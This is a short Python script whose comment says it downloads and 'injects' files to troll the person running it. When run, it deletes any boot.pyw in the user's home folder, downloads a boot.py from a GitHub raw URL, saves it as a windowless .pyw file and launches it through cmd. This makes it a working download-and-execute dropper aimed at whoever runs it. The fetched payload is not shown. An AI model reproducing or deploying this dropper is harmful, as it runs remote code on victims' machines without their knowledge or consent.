# Downloads and injects the files needed to troll your dumbass
def clone():
    import os, urllib.request, pathlib
    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/boot.py'
    home = os.path.expanduser("~")
    path = str(home) + '\boot.pyw'
    path = '{}'.format(path)
    try:
        os.remove(path)
    except FileNotFoundError:
        print('New System')
    urllib.request.urlretrieve(dlurl, '{}'.format(path))
    os.chdir(home)
    os.system("start cmd /c {}".format('py ' + path))
    exit()

clone()